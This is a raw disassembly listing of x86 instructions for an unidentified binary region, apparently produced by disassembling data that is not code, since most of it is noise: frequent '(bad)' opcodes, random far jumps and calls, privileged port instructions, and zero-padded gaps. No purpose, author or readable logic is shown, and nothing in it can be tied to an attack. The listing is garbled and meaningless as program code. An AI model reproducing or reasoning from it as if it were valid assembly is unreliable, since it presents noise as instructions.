  421c87:	cmp    esp,DWORD PTR [esi+0x7d3e3643]
  421c8d:	mov    al,ds:0xf29f5f
	...
  421cf2:	add    BYTE PTR [eax],al
  421cf4:	mov    al,0x6b
  421cf6:	mov    ch,0xe5
  421cf8:	(bad)  
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	clc    
  421d01:	inc    eax
  421d02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d03:	xor    al,0xc0
  421d05:	push   0x1050001
  421d0a:	add    BYTE PTR [eax],al
  421d0c:	div    DWORD PTR [edx+0x49]
  421d0f:	sbb    eax,0x3ebbd3e0
  421d14:	dec    ecx
  421d15:	call   0xe55bedcb
  421d1a:	or     al,0xfc
  421d1c:	sar    BYTE PTR [ebx],1
  421d1e:	pushw  es
  421d20:	jmp    0x5af8:0xf5d1fb16
  421d27:	fwait
  421d28:	mov    ds:0xc789e6fc,eax
  421d2d:	lea    ecx,cs:[eax-0xe]
  421d31:	xchg   esp,eax
  421d32:	rcr    DWORD PTR [ecx-0x136dc516],1
  421d38:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  421d3a:	ss test eax,0x9f338afc
  421d40:	stos   BYTE PTR es:[edi],al
  421d41:	repz (bad) 
  421d43:	jo     0x421d24
  421d45:	pop    DWORD PTR [edx+0x58]
  421d48:	stc    
  421d49:	or     DWORD PTR [edx+ebp*2],edx
  421d4c:	inc    esp
  421d4d:	sar    DWORD PTR [edx],1
  421d4f:	std    
  421d50:	and    esi,DWORD PTR [edx]
  421d52:	inc    ebp
  421d53:	fld    TBYTE PTR [esi]
  421d55:	mov    ch,0x94
  421d57:	leave  
  421d58:	xchg   edx,eax
  421d59:	jge    0x421d3c
  421d5b:	into   
  421d5c:	lds    esi,FWORD PTR [ebx]
  421d5e:	mov    al,ds:0x24e7ae54
  421d63:	mov    ds:0x1fca84c3,eax
  421d68:	xchg   esp,eax
  421d69:	(bad)  
  421d6a:	mov    edx,0x37072216
  421d6f:	test   DWORD PTR [edi],esp
  421d71:	mov    ds:0xc6e5e3db,al
  421d76:	(bad)  
  421d78:	repnz dec edi
  421d7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d7b:	mov    al,BYTE PTR [eax]
  421d7d:	rol    esp,0xa
  421d80:	mul    edi
  421d82:	es loop 0x421d5f
  421d85:	push   0x5c
  421d87:	cmc    
  421d88:	push   ss
  421d89:	hlt    
  421d8a:	ss data16 (bad) 
  421d8d:	cmp    al,0xd2
  421d8f:	jge    0x421d90
  421d91:	aad    0xe2
  421d93:	rcr    ecx,1
  421d95:	call   0xca44:0x1b32922
  421d9c:	cdq    
  421d9d:	lock adc BYTE PTR [esi+0x33],ch
  421da1:	pop    edi
  421da2:	mov    eax,0x7ad668a2
  421da7:	fdiv   QWORD PTR [ecx+0x4cc5fc9f]
  421dad:	sub    edx,DWORD PTR [eax-0x42302f89]
  421db3:	(bad)  
  421db4:	sbb    eax,0xaf3e2c49
  421db9:	push   ebp
  421dba:	hlt    
  421dbb:	ret    
  421dbc:	leave  
  421dbd:	shl    dh,cl
  421dbf:	mov    ch,0x59
  421dc1:	add    al,BYTE PTR [edi+esi*8]
  421dc4:	mov    bh,0x29
  421dc6:	xor    esp,DWORD PTR [ebp-0x5]
  421dc9:	push   cs
  421dca:	sub    eax,0xa2fed4f6
  421dcf:	addr16 call 0xcfcbcaf9
  421dd5:	and    eax,0x5085692d
  421dda:	bound  esp,QWORD PTR [ebp-0xd]
  421ddd:	mov    bh,0xb3
  421ddf:	add    BYTE PTR [edx-0x37],bh
  421de2:	jmp    0x27f1:0x48086955
  421de9:	inc    eax
  421dea:	lods   eax,DWORD PTR ds:[esi]
  421deb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421dec:	test   BYTE PTR [edi-0x63695376],cl
  421df2:	ret    0x4993
  421df5:	inc    eax
  421df6:	in     eax,0x67
  421df8:	jg     0x421e4c
  421dfa:	mov    DWORD PTR [esi],0x7b5af0f3
  421e00:	mov    al,ds:0xa36d3e39
  421e05:	dec    BYTE PTR [edi-0x2]
  421e08:	jno    0x421e6a
  421e0a:	lds    esi,FWORD PTR [esi]
  421e0c:	jne    0x421e21
  421e0e:	inc    esi
  421e0f:	add    BYTE PTR cs:[eax],0x0
	...
  421e73:	add    bh,cl
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	test   DWORD PTR [edx],ebp
  421e82:	jle    0x421ed4
  421e84:	lds    ebp,FWORD PTR [ecx+0x1]
  421e87:	add    BYTE PTR ds:0x62000001,al
  421e8d:	push   ebp
  421e8e:	scas   al,BYTE PTR es:[edi]
  421e8f:	xchg   edx,eax
  421e90:	push   ss
  421e91:	sub    al,0x1c
  421e93:	jne    0x421e60
  421e95:	les    ebx,FWORD PTR ds:0xbe3a9fa2
  421e9b:	ficomp DWORD PTR [esi+0x2a]
  421e9e:	(bad)  
  421e9f:	std    
  421ea0:	daa    
  421ea1:	cmp    BYTE PTR [ebx],ah
  421ea3:	inc    ecx
  421ea4:	fisub  DWORD PTR [edx-0x2e914dc9]
  421eaa:	jp     0x421eae
  421eac:	call   0x6e4f:0x8be3d16
  421eb3:	push   esi
  421eb4:	clc    
  421eb5:	scas   al,BYTE PTR es:[edi]
  421eb6:	mov    eax,ds:0x59dee1f2
  421ebb:	xor    ah,BYTE PTR [esi-0x78]
  421ebe:	pushw  ss
  421ec0:	pop    ss
  421ec1:	dec    esp
  421ec2:	add    cl,dh
  421ec4:	adc    BYTE PTR [ebx-0x4057bf43],ah
  421eca:	out    0x8e,eax
  421ecc:	lahf   
  421ecd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ece:	jg     0x421ee6
  421ed0:	shr    DWORD PTR [esi],1
  421ed2:	and    BYTE PTR [edx],0xc9
  421ed5:	jle    0x421eee
  421ed7:	ret    0xaae6
  421eda:	push   0xad076e43
  421edf:	or     eax,0x891e83d5
  421ee4:	(bad)
  421ee8:	ds sbb eax,0xab7b360b
  421eee:	sub    DWORD PTR [edi+0x35],eax
  421ef1:	xor    ebx,0x7143f4de
  421ef7:	sub    ecx,DWORD PTR [edx+0x50799e75]
  421efd:	mov    eax,0xd2e34936
  421f02:	inc    ebx
  421f03:	ins    BYTE PTR es:[edi],dx
  421f04:	sub    bh,ch
  421f06:	jno    0x421eab
  421f08:	test   BYTE PTR [edx],cl
  421f0a:	jge    0x421eb4
  421f0c:	dec    esi
  421f0d:	cmovb  edi,DWORD PTR [edx]
  421f10:	test   al,0xe5
  421f12:	sub    eax,0x8971812a
  421f17:	fs sti 
  421f19:	lods   al,BYTE PTR ds:[esi]
  421f1a:	adc    BYTE PTR [ecx-0x3c6bea55],al
  421f20:	fimul  WORD PTR [ecx]
  421f22:	ror    DWORD PTR [edi],cl
  421f24:	sbb    eax,0x6de916c1
  421f29:	dec    eax
  421f2a:	in     eax,0xc1
  421f2c:	xchg   BYTE PTR [esi+0x2d],ch
  421f2f:	sahf   
  421f30:	scas   eax,DWORD PTR es:[edi]
  421f31:	jae    0x421f6f
  421f33:	jg     0x421f9d
  421f35:	inc    esi
  421f36:	add    edi,DWORD PTR [esi+0x784aec2a]
  421f3c:	sub    ch,al
  421f3e:	jg     0x421f64
  421f40:	(bad)  
  421f41:	js     0x421ef7
  421f43:	jne    0x421ee1
  421f45:	push   edi
  421f46:	adc    eax,DWORD PTR [esi+0x591af71c]
  421f4c:	aas    
  421f4d:	mov    ebx,0xa8d88920
  421f52:	cs pop es
  421f54:	ror    BYTE PTR [ecx],0x3
  421f57:	out    dx,al
  421f58:	xchg   edi,edi
  421f5a:	fadd   QWORD PTR [ebx-0x77d42912]
  421f60:	and    BYTE PTR [ebp+0x5bc75c2c],bh
  421f66:	inc    esi
  421f67:	push   edi
  421f68:	xchg   ecx,eax
  421f69:	arpl   WORD PTR [ebp+eax*1-0x13],ax
  421f6d:	or     bl,BYTE PTR [ebx-0x4ee342f4]
  421f73:	enter  0xbe12,0x2e
  421f77:	xor    al,0xca
  421f79:	lock push 0xffffffd6
  421f7c:	shl    BYTE PTR [ecx+0xc84aaa3],0x22
  421f83:	pushf  
  421f84:	and    eax,0xbd49a224
  421f89:	jge    0x421f9b
  421f8b:	xor    DWORD PTR [edx+0x1b],ecx
  421f8e:	hlt    
  421f8f:	pushf  
  421f90:	cli    
	...
  421ff1:	add    BYTE PTR [eax],al
  421ff3:	add    BYTE PTR [ebx+0x6],ch
  421ff6:	(bad)  
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	mov    cx,0xb147
  422003:	sub    eax,0x16aca
  422008:	add    eax,0x94000001
  42200d:	je     0x421ffb
  42200f:	jae    0x421fee
  422011:	int    0x9e
  422013:	mov    dh,0x93
  422015:	outs   dx,BYTE PTR ds:[esi]
  422016:	pop    ebx
  422017:	xchg   BYTE PTR [edx],bl
  422019:	adc    dl,BYTE PTR [edx-0x4adb8ea1]
  42201f:	frstor [eax+0x3]
  422022:	jge    0x42209b
  422024:	inc    esp
  422025:	sub    esi,DWORD PTR [ecx+0x1e946493]
  42202b:	or     ebx,DWORD PTR [edi+0x12]
  42202e:	inc    edi
  42202f:	stos   BYTE PTR es:[edi],al
  422030:	and    edx,DWORD PTR [ebx]
  422032:	mov    ebp,0x5efd3f91
  422037:	mov    WORD PTR [eax+0x4e06a47d],gs
  42203d:	retf   
  42203e:	hlt    
  42203f:	or     BYTE PTR [esi+0x77],dh
  422042:	sahf   
  422043:	sub    bl,dl
  422045:	sbb    bh,BYTE PTR [esi+edx*8+0xc]
  422049:	les    ebx,FWORD PTR [ecx+0x3eb19206]
  42204f:	test   DWORD PTR [ebx-0x70],eax
  422052:	scas   al,BYTE PTR es:[edi]
  422053:	(bad)  
  422054:	pop    ebx
  422055:	in     eax,dx
  422056:	or     BYTE PTR [edi-0x46],cl
  422059:	or     BYTE PTR [ecx+0x78],bh
  42205c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42205d:	dec    edx
  42205e:	push   DWORD PTR [ebx+0x267bcd87]
  422064:	or     al,0xae
  422066:	daa    
  422067:	sbb    DWORD PTR [ebp+0x38],0x19
  42206b:	scas   al,BYTE PTR es:[edi]
  42206c:	or     al,BYTE PTR [edi-0x2d35884d]
  422072:	mov    cl,0xec
  422074:	outs   dx,BYTE PTR ds:[esi]
  422075:	add    bh,BYTE PTR [eax]
  422077:	xchg   BYTE PTR [esi+0x475e0fd3],dh
  42207d:	push   esi
  42207e:	xor    BYTE PTR [eax+edx*1+0x6752bb],0xe7
  422086:	push   es
  422087:	sti    
  422088:	ss (bad) 
  42208a:	and    DWORD PTR [edi+0x3f],ecx
  42208d:	mov    cl,0xdc
  42208f:	jo     0x42209f
  422091:	loop   0x4220ca
  422093:	inc    esi
  422094:	arpl   ax,ax
  422096:	fs aas 
  422098:	inc    esp
  422099:	call   0x9c71cf6b
  42209e:	pop    esp
  42209f:	or     al,0x72
  4220a1:	inc    ecx
  4220a2:	out    0x3d,al
  4220a4:	in     eax,dx
  4220a5:	mov    esi,0x92fbd810
  4220aa:	popf   
  4220ab:	and    eax,0xa273ffc2
  4220b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220b1:	outs   dx,BYTE PTR ds:[esi]
  4220b2:	test   DWORD PTR [ebx-0x70],0x7727d50
  4220b9:	cli    
  4220ba:	mov    ecx,0x52c2e537
  4220bf:	ins    BYTE PTR es:[edi],dx
  4220c0:	mov    ebx,0x537bd542
  4220c5:	inc    esp
  4220c6:	mov    ds:0xaca21456,eax
  4220cb:	(bad)  
  4220cd:	xchg   ecx,eax
  4220ce:	shl    BYTE PTR [ebx],cl
  4220d0:	push   ds
  4220d1:	ja     0x42209f
  4220d3:	les    ebp,FWORD PTR [edx+0x7b757859]
  4220d9:	sbb    eax,0x75940b80
  4220de:	shl    BYTE PTR [esi-0x34],cl
  4220e1:	lock add eax,0x55bfacf
  4220e8:	push   ecx
  4220e9:	(bad)  [eax+edx*2-0x7c]
  4220ed:	repnz loope 0x422092
  4220f0:	mov    dl,0xa2
  4220f2:	js     0x422105
  4220f4:	imul   esp,DWORD PTR [ecx],0x2a
  4220f7:	mov    ds:0xe999207d,al
  4220fc:	cmp    eax,edi
  4220fe:	and    al,0xe
  422100:	or     BYTE PTR [ebx],dh
  422102:	cli    
  422103:	or     BYTE PTR [esi-0x5e7a9f1c],0xbc
  42210a:	and    ebp,ebp
  42210c:	and    esp,DWORD PTR [edx]
  42210e:	pop    ss
  42210f:	popf   
  422110:	add    BYTE PTR gs:[eax],al
	...
  422173:	add    BYTE PTR [esi-0x284ae],ah
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    eax,esp
  422181:	xchg   ebx,eax
  422182:	mov    edi,0x16bcf44
  422187:	add    BYTE PTR ds:0x9d000001,al
  42218d:	jg     0x42212c
  42218f:	(bad)  
  422190:	(bad)  
  422191:	int    0x58
  422193:	iret   
  422194:	test   BYTE PTR [esi+0x6f4ab9b6],bl
  42219a:	xor    eax,DWORD PTR [ecx-0x10]
  42219d:	mov    al,al
  42219f:	pop    ecx
  4221a0:	mov    DWORD PTR [edi],eax
  4221a2:	enter  0xdf4a,0x86
  4221a6:	xchg   ebp,eax
  4221a7:	jbe    0x42217a
  4221a9:	dec    eax
  4221aa:	dec    eax
  4221ab:	add    BYTE PTR [edi+0x2b],0xc8
  4221af:	xor    edx,DWORD PTR [esi-0x69]
  4221b2:	xor    ebp,0x13
  4221b5:	lods   al,BYTE PTR ds:[esi]
  4221b6:	jnp    0x422146
  4221b8:	test   DWORD PTR [ebx+eiz*8],ebx
  4221bb:	lock imul esp,DWORD PTR [edx-0x17],0x37933f9c
  4221c3:	pop    ebp
  4221c4:	sbb    edx,edx
  4221c6:	lea    ebx,[ecx-0x7273076]
  4221cc:	sahf   
  4221cd:	xor    esp,ecx
  4221cf:	or     ebx,0x53
  4221d2:	cmp    dl,al
  4221d4:	sub    eax,0x47c146f2
  4221d9:	repnz dec ecx
  4221db:	inc    ebx
  4221dc:	jg     0x42217c
  4221de:	or     bh,BYTE PTR [edi+eiz*2+0x6ec85a97]
  4221e5:	pop    edi
  4221e6:	sbb    DWORD PTR [ecx-0x9],0xc37a38c
  4221ed:	clc    
  4221ee:	or     eax,0x525ef9a
  4221f3:	mov    DWORD PTR [esp+ecx*1],ebp
  4221f6:	sub    ebx,ebp
  4221f8:	mov    edx,0x60c5d707
  4221fd:	das    
  4221fe:	fs mov edi,0x73470202
  422204:	inc    ebx
  422205:	lds    ecx,FWORD PTR [edi]
  422207:	dec    esi
  422208:	mov    dl,0x1b
  42220a:	push   ebx
  42220b:	xor    BYTE PTR [ebp+0x6c1a45ea],ch
  422211:	or     al,0xe3
  422213:	mov    ds:0x25b99961,al
  422218:	int    0x9a
  42221a:	push   esp
  42221b:	call   0x456d9569
  422220:	ins    BYTE PTR es:[edi],dx
  422221:	es out dx,eax
  422223:	mov    eax,0x5c50c25b
  422228:	call   0x62795670
  42222d:	ja     0x422207
  42222f:	(bad)  
  422231:	sub    eax,DWORD PTR [edx-0x49]
  422234:	test   BYTE PTR [esi+eiz*4],cl
  422237:	push   0xa12e8cd4
  42223c:	inc    ecx
  42223d:	xacquire xchg BYTE PTR [ecx],cl
  422240:	fsub   DWORD PTR [edx+eiz*1]
  422243:	loope  0x42227b
  422245:	pop    esp
  422246:	test   al,0x69
  422248:	(bad)  
  422249:	out    0x9,eax
  42224b:	xlat   BYTE PTR ds:[ebx]
  42224c:	xor    ah,bl
  42224e:	inc    edi
  42224f:	adc    ch,0x79
  422252:	leave  
  422253:	cmp    esi,DWORD PTR [eax]
  422255:	jle    0x42225e
  422257:	mov    ch,BYTE PTR [ecx-0x73740c9f]
  42225d:	bound  edi,QWORD PTR [eax+0x60bdfd90]
  422263:	mov    ebx,0x9faba89c
  422268:	inc    esi
  422269:	pushf  
  42226a:	cs push edi
  42226c:	xor    DWORD PTR [ecx-0x24ec6969],ebx
  422272:	pop    es
  422273:	dec    eax
  422274:	data16 jne 0x4222bd
  422277:	outs   dx,BYTE PTR ds:[esi]
  422278:	int3   
  422279:	in     eax,0x13
  42227b:	xor    ebp,esp
  42227d:	mov    esp,DWORD PTR [esi]
  42227f:	jecxz  0x42222c
  422281:	in     al,dx
  422282:	push   eax
  422283:	not    DWORD PTR fs:[eax+0x2c9c0eed]
  42228a:	or     DWORD PTR [esp+edi*4-0x2e003389],esp
	...
  4222f1:	add    BYTE PTR [eax],al
  4222f3:	add    BYTE PTR [edi-0x10085213],cl
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	add    DWORD PTR [ecx],ebp
  422302:	mov    ah,0xbb
  422304:	aam    0x6c
  422306:	add    DWORD PTR [eax],eax
  422308:	add    eax,0xd7000001
  42230d:	jmp    0x2ff4:0x6582be9c
  422314:	loopne 0x422361
  422316:	ret    0x7c3f
  422319:	sub    eax,0xe8b0b755
  42231e:	inc    edx
  42231f:	adc    ebp,DWORD PTR ds:0xc52a54af
  422325:	das    
  422326:	xor    ecx,ecx
  422328:	mov    dh,0xd3
  42232a:	and    al,0x23
  42232c:	jle    0x4222cc
  42232e:	xor    DWORD PTR [eax+0x4e],edx
  422331:	scas   eax,DWORD PTR es:[edi]
  422332:	ja     0x4222f8
  422334:	mov    ebx,0x3356b36a
  422339:	pop    eax
  42233a:	int    0xa2
  42233c:	jae    0x422355
  42233e:	mov    ch,al
  422340:	fabs   
  422342:	pop    edx
  422343:	out    0xb3,al
  422345:	jge    0x42233e
  422347:	pop    ebp
  422348:	push   ecx
  422349:	xchg   edx,eax
  42234a:	mov    WORD PTR [ebp+0x6f5232e0],fs
  422350:	out    dx,eax
  422351:	adc    ebp,esi
  422353:	addr16 push ebx
  422355:	pop    edi
  422356:	int3   
  422357:	frstor [eax+0x357912f4]
  42235d:	pop    ds
  42235e:	push   eax
  42235f:	pusha  
  422360:	inc    edx
  422361:	pop    edi
  422362:	xor    al,0xf6
  422364:	(bad)  
  422365:	addr16 in eax,0x86
  422368:	scas   al,BYTE PTR es:[edi]
  422369:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42236a:	jns    0x422357
  42236c:	ins    BYTE PTR es:[edi],dx
  42236d:	test   eax,0x20d630c7
  422372:	nop
  422373:	push   eax
  422374:	adc    cl,BYTE PTR [edx+0x0]
  422377:	out    0x93,al
  422379:	add    BYTE PTR [ecx+0x10],ah
  42237c:	dec    DWORD PTR [eax+0x7ceee8d7]
  422382:	jle    0x422349
  422384:	sub    eax,0x496f4358
  422389:	mov    eax,ebp
  42238b:	jge    0x4223f8
  42238d:	inc    esp
  42238e:	neg    DWORD PTR [eax-0x62]
  422391:	dec    ebp
  422392:	inc    ebp
  422393:	mov    bh,0x82
  422395:	dec    esp
  422396:	sub    al,BYTE PTR [ebp-0x54c7fa10]
  42239c:	pop    esi
  42239d:	stc    
  42239e:	int    0x96
  4223a0:	nop
  4223a1:	in     al,0x14
  4223a3:	mov    cl,BYTE PTR [ebx+ecx*4]
  4223a6:	(bad)  
  4223a8:	retf   0x46dd
  4223ab:	inc    ebx
  4223ac:	mov    al,0xcf
  4223ae:	loopne 0x422398
  4223b0:	ret    0x56de
  4223b3:	push   es
  4223b4:	gs mov bh,0xb2
  4223b7:	idiv   BYTE PTR [ecx]
  4223b9:	jbe    0x4223f8
  4223bb:	icebp  
  4223bc:	push   es
  4223bd:	dec    edi
  4223be:	add    eax,0x31a2f97d
  4223c3:	cmp    ah,BYTE PTR [edi]
  4223c5:	fldenv [ebp-0x30]
  4223c8:	inc    esp
  4223c9:	in     al,0xf7
  4223cb:	pop    ss
  4223cc:	mov    WORD PTR [ebp+0x2b761ed],fs
  4223d2:	jmp    0xc327:0xee8dff5f
  4223d9:	fstp   QWORD PTR [ecx-0x6491cbbf]
  4223df:	jnp    0x42242f
  4223e1:	xchg   edx,eax
  4223e2:	jge    0x4223c0
  4223e4:	mov    esp,0xf3dce941
  4223e9:	mov    esp,0x386c50e5
  4223ee:	test   BYTE PTR [edx-0x6],dl
  4223f1:	bound  ebp,QWORD PTR [esi]
  4223f3:	add    BYTE PTR [ecx+0x6e],ah
  4223f6:	inc    esi
  4223f7:	xchg   ecx,eax
  4223f8:	jo     0x4223c0
  4223fa:	lock mov ebx,ebx
  4223fd:	pop    esi
  4223fe:	and    BYTE PTR [ebx],bh
  422400:	pop    esi
  422401:	outs   dx,BYTE PTR ds:[esi]
  422402:	add    BYTE PTR [ebp+0x3f],bl
  422405:	loop   0x4223b4
  422407:	dec    ecx
  422408:	sub    esi,esi
  42240a:	cld    
  42240b:	pop    ss
  42240c:	dec    ebp
  42240d:	div    ecx
  42240f:	pxor   mm0,QWORD PTR [eax]
	...
  422472:	add    BYTE PTR [eax],al
  422474:	push   edx
  422475:	sub    BYTE PTR [esi],0x69
  422478:	(bad)  
  422479:	in     eax,dx
  42247a:	push   edi
  42247b:	mov    ebx,0x99e531bb
  422480:	out    dx,eax
  422481:	int3   
  422482:	and    ecx,DWORD PTR [eax+0x16dd9]
  422488:	add    eax,0x2000001
  42248d:	xchg   DWORD PTR [ebp+0x30],ebx
  422490:	jae    0x42243c
  422492:	add    esi,DWORD PTR [ecx-0x6624c7e5]
  422498:	in     al,dx
  422499:	push   edx
  42249a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42249b:	pop    edi
  42249c:	pop    ecx
  42249d:	add    DWORD PTR [edx],edx
  42249f:	jbe    0x4224f8
  4224a1:	into   
  4224a2:	mov    esp,DWORD PTR [esi]
  4224a4:	sub    cl,BYTE PTR [ebx]
  4224a6:	shl    edi,cl
  4224a8:	xor    DWORD PTR [eax+0x6a8d90ef],edi
  4224ae:	mov    bl,0x7d
  4224b0:	loopne 0x422495
  4224b2:	sbb    dl,BYTE PTR [ebp+0x15759bb8]
  4224b8:	mov    esi,0x6120e65b
  4224bd:	mov    ds:0xe0a919dd,eax
  4224c2:	pop    ebx
  4224c3:	jp     0x4224f4
  4224c5:	push   cs
  4224c6:	bound  esi,QWORD PTR [edx+0x559547df]
  4224cc:	fwait
  4224cd:	test   ah,bl
  4224cf:	jb     0x4224c1
  4224d1:	xchg   esp,eax
  4224d2:	sbb    eax,0xd74562c3
  4224d7:	lahf   
  4224d8:	xor    BYTE PTR [eax+0xb28bb25],0xff
  4224df:	push   edx
  4224e0:	std    
  4224e1:	push   eax
  4224e2:	hlt    
  4224e3:	(bad)  
  4224e4:	xlat   BYTE PTR ds:[ebx]
  4224e5:	inc    esi
  4224e6:	jmp    0x42246f
  4224e8:	xor    ch,dl
  4224ea:	pop    ss
  4224eb:	stc    
  4224ec:	adc    BYTE PTR [ecx+eiz*4-0x7eaddaa4],dh
  4224f3:	xor    al,0xa1
  4224f5:	adc    eax,0x433a5b1
  4224fa:	xchg   BYTE PTR [edi+ecx*2],ah
  4224fd:	out    dx,al
  4224fe:	lods   al,BYTE PTR ds:[esi]
  4224ff:	popf   
  422500:	outs   dx,DWORD PTR ds:[esi]
  422501:	push   edi
  422502:	in     al,dx
  422503:	cmc    
  422504:	xchg   ebx,eax
  422505:	or     eax,0xea9f9ace
  42250a:	push   ss
  42250b:	icebp  
  42250c:	imul   ebx,DWORD PTR [eax-0x34],0xd9f9a6c2
  422513:	test   DWORD PTR [esi-0x23d46e3d],0x8327cf81
  42251d:	inc    esi
  42251e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42251f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422520:	stos   BYTE PTR es:[edi],al
  422521:	shl    BYTE PTR [edi+0x51bad4ca],cl
  422527:	xor    DWORD PTR [ebp+0x7ccfb8f3],esi
  42252d:	dec    ebx
  42252e:	xor    eax,DWORD PTR [eax+edi*8+0x480152f7]
  422535:	mov    al,0xe4
  422537:	mov    bh,0x74
  422539:	mov    edi,0x42b301a5
  42253e:	int3   
  42253f:	or     eax,0x27e64a3
  422544:	pop    DWORD PTR [eax-0x7e]
  422547:	xor    al,0x96
  422549:	pop    ebx
  42254a:	paddusb mm1,QWORD PTR [ebp+0x59ac3fff]
  422551:	test   al,0x95
  422553:	call   0x7de6:0x2e9a508c
  42255a:	in     eax,dx
  42255b:	fwait
  42255c:	neg    BYTE PTR [eax+0x64]
  42255f:	fisubr WORD PTR [edi+eax*1]
  422562:	add    bh,BYTE PTR [eax+0x7c24125c]
  422568:	inc    esp
  422569:	(bad)
  42256c:	xchg   edi,eax
  42256d:	xchg   DWORD PTR [edi],eax
  42256f:	add    edx,0x30
  422572:	out    dx,eax
  422573:	inc    edi
  422574:	add    DWORD PTR [ebx-0x33abc73a],0x2d
  42257b:	xchg   BYTE PTR [esi],al
  42257d:	add    eax,0x4e11a815
  422582:	or     al,0x4e
  422584:	and    eax,0x283113bd
  422589:	mov    DWORD PTR [esi],ecx
  42258b:	loop   0x42253a
  42258d:	cwde   
  42258e:	sub    edx,eax
  422590:	dec    edi
	...
  4225f1:	add    BYTE PTR [eax],al
  4225f3:	add    BYTE PTR [edx-0x40887052],bl
  4225f9:	ja     0x4225f5
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx+0x301ca2f8]
  422602:	jg     0x422620
  422604:	fisubr WORD PTR [esi+0x1]
  422607:	add    BYTE PTR ds:0xfb000001,al
  42260d:	and    ecx,DWORD PTR [ebx+0x27]
  422610:	sub    ch,0xdb
  422613:	sub    DWORD PTR [ecx-0x187d79ea],ebp
  422619:	sahf   
  42261a:	ret    0xe901
  42261d:	mov    eax,0x793a4f87
  422622:	xchg   cl,dh
  422624:	sbb    dl,BYTE PTR [ebx+0x6d]
  422627:	xchg   edi,eax
  422628:	int    0x5
  42262a:	sbb    al,0x2f
  42262c:	sbb    dh,BYTE PTR [eax+0x46b71bfe]
  422632:	dec    esp
  422633:	and    BYTE PTR [edi+ecx*4-0x774eac9d],ch
  42263a:	(bad)  
  42263c:	lock cmc 
  42263e:	adc    eax,0x9f2a18aa
  422643:	retf   
  422644:	or     ah,BYTE PTR [eax+0x6c]
  422647:	scas   eax,DWORD PTR es:[edi]
  422648:	and    BYTE PTR ds:0x52aa6765,bl
  42264e:	gs pop edx
  422650:	inc    esi
  422652:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  422654:	sbb    ah,BYTE PTR [edx]
  422656:	arpl   sp,bx
  422658:	add    bh,BYTE PTR [esi]
  42265a:	mov    al,ch
  42265c:	rol    DWORD PTR [eax+0x6bed2640],1
  422662:	sub    eax,0xa25c10e4
  422667:	mov    bh,BYTE PTR [ecx-0x44]
  42266a:	or     al,0x2f
  42266c:	push   esi
  42266d:	mov    esp,cs
  42266f:	xor    BYTE PTR [edx+0x65],bl
  422672:	cld    
  422673:	xchg   ecx,eax
  422674:	aad    0x2e
  422676:	inc    ebp
  422677:	stos   BYTE PTR es:[edi],al
  422678:	std    
  422679:	jo     0x4226a2
  42267b:	mov    ds:0xea502bf1,eax
  422680:	cmp    BYTE PTR [ecx-0x1000b433],cl
  422686:	xor    ah,bl
  422688:	ret    
  422689:	outs   dx,BYTE PTR ds:[esi]
  42268a:	mov    eax,0xfee2cf8c
  42268f:	into   
  422690:	xlat   BYTE PTR ds:[ebx]
  422691:	(bad)  
  422692:	stos   BYTE PTR es:[edi],al
  422693:	dec    ebp
  422694:	dec    ebx
  422695:	adc    eax,0x3f16564
  42269a:	xchg   edi,eax
  42269b:	mov    ebx,0x300e1f54
  4226a0:	push   ss
  4226a1:	out    0xa,al
  4226a3:	repz dec edi
  4226a5:	mov    esp,0x1a106cde
  4226aa:	lahf   
  4226ab:	jnp    0x422713
  4226ad:	xchg   ecx,eax
  4226ae:	out    dx,eax
  4226af:	in     al,0x3d
  4226b1:	mov    ah,0x2b
  4226b3:	(bad)  
  4226b4:	popa   
  4226b5:	cmc    
  4226b6:	or     ch,dh
  4226b8:	(bad)  
  4226b9:	rol    DWORD PTR [eax+0x42bd86fa],cl
  4226bf:	popf   
  4226c0:	inc    ecx
  4226c1:	add    BYTE PTR [eax-0x77462042],0xed
  4226c8:	movlps xmm7,QWORD PTR [ecx]
  4226cb:	mov    ebx,0xda0177a8
  4226d0:	mov    dl,0x43
  4226d2:	inc    eax
  4226d3:	sbb    al,0x20
  4226d5:	leave  
  4226d6:	mov    cl,0xb3
  4226d8:	push   ecx
  4226d9:	pop    ss
  4226da:	jg     0x4226e3
  4226dc:	mov    ecx,DWORD PTR [ecx-0x6b]
  4226df:	jecxz  0x42266c
  4226e1:	sti    
  4226e2:	pop    edx
  4226e3:	cmp    bl,BYTE PTR [eax]
  4226e5:	pop    edx
  4226e6:	add    ecx,esi
  4226e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226e9:	push   es
  4226ea:	xchg   edi,eax
  4226eb:	popf   
  4226ec:	sbb    ebp,ebp
  4226ee:	adc    eax,0xcf93f96c
  4226f3:	and    cl,BYTE PTR [eax+0x26]
  4226f6:	dec    edx
  4226f7:	xchg   BYTE PTR [eax],cl
  4226f9:	push   edx
  4226fa:	mov    bh,0x51
  4226fc:	and    BYTE PTR [edi+esi*1-0x28],dl
  422700:	repz sahf 
  422702:	add    BYTE PTR [ebp+eax*2+0x163e062c],dh
